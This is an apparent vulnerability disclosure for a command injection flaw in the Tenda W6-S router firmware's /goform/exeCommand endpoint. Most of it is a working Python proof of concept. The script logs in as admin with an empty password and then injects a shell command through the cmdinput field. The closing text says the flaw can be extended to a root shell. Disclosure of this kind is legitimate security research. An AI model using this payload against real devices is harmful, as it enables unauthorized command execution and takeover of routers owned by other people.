# Tenda W6-S V1.0.0.4(510) command injection vulnerability

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-2627.html


## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W6-S/exeCommand/img/1.png)

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W6-S/exeCommand/img/2.png)

In /goform/exeCommand, cmdinput is controlled by the user, it will be copied to s by vos_strcpy, and finally tpi_get_ping_output will be called to execute the command, which is not restricted, resulting in a command injection vulnerability

## Poc

```python
import requests

target_url = 'http://192.168.10.105/login/Auth'

target_headers = {'Host' : '192.168.10.105',
'Content-Length' : '65',
'Accept' : '*/*',
'X-Requested-With' : 'XMLHttpRequest',
'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin' : 'http://192.168.10.105',
'Referer' : 'http://192.168.10.105/main.html',
'Accept-Encoding' : 'gzip, deflate',
'Accept-Language' : 'en-US,en;q=0.9',
'Cookie' : 'user=',
'Connection' : 'close'}
p1 = 'usertype=admin&password=&time=2022;7;6;14;9;6&username='

requests.post(target_url, headers = target_headers, data = p1, verify = False, timeout = 1)

target_url = 'http://192.168.10.105/goform/exeCommand'

target_headers = {'Host' : '192.168.10.105',
'Content-Length' : '295',
'Accept' : '*/*',
'X-Requested-With' : 'XMLHttpRequest',
'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
'Origin' : 'http://192.168.10.105',
'Referer' : 'http://192.168.10.105/main.html',
'Accept-Encoding' : 'gzip, deflate',
'Accept-Language' : 'en-US,en;q=0.9',
'Cookie' : 'user=',
'Connection' : 'close'}

p2 = 'cmdinput=asd;ls -la . > ./tmp/test;aa'

requests.post(target_url, headers = target_headers, data = p2, verify = False, timeout = 1)
```

You can see that the command was executed successfully, and finally you can write exp to get the root shell

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W6-S/exeCommand/img/3.png)
